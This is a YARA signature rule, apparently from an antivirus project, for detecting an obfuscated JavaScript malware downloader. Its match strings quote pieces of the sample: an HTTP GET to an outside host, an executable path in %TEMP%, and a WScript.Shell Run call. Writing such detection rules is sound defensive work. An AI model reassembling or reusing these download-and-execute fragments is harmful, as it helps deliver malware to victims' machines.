rule sig_20160328_e6c0b29117e3776865f653310cebca40 {
  meta:
    description = "datamaliciousorder - file 20160328_e6c0b29117e3776865f653310cebca40.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "502f1837559691193cddbb87fdffa7e331b039fa417553baf2c36463a328ca2c"

  strings:
    $s1  = "function Vjbjf() {return Iuoyi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"mPCCfcZGReDfdc5i.exe\";};" fullword ascii
    $s2  = "Sniniwteoe[Rxdptkrx](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Pibgwqbxns](Htlqqu() * 11)} while (Sniniwteoe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Vwlusg(Nuiahpjluo, Qbtremriwn){return Nuiahpjluo - Qbtremriwn;};" fullword ascii
    $s5  = "var Iuoyi = function Jaycnafl() {return WScript[Hrwfrrxhg](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Jfgrtapdl() {return ((Lihpjfmlx == true) && (Lihpjfmlx == Kowvmr)) ? 1 : Ummqrd;};" fullword ascii
    $s7  = "function Xnvvrh(Nsuwmfot){Iuoyi[\"Run\"](Nsuwmfot, Ummqrd, Ummqrd);};" fullword ascii
    $s8  = "function Ozudjr(){return Udtyuyxzc;};" fullword ascii
    $s9  = "var Aazmsd = new this[\"Date\"]();" fullword ascii
    $s10 = "function Bpzbgpqo(){return Hrwfrrxhg;};" fullword ascii
    $s11 = "function Htlqqu(){return 22;};" fullword ascii
    $s12 = "Lihpjfmlx = true; " fullword ascii
    $s13 = " while (Dksuoywtqm){" fullword ascii
    $s14 = "function Rgbvqe(Foqgpftybt) {var Gnlwg = (1, 2, 3, 4, 5, Foqgpftybt); return Gnlwg;};" fullword ascii
    $s15 = "function Kfdurpqyqh()" fullword ascii
    $s16 = "var Lihpjfmlx = false;" fullword ascii
    $s17 = "return Vwlusg(Ansggscj, Ufuwhchnno);" fullword ascii
    $s18 = "var Cblwuodztu = false;" fullword ascii
    $s19 = "Kowvmr = true; " fullword ascii
    $s20 = "var Kowvmr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}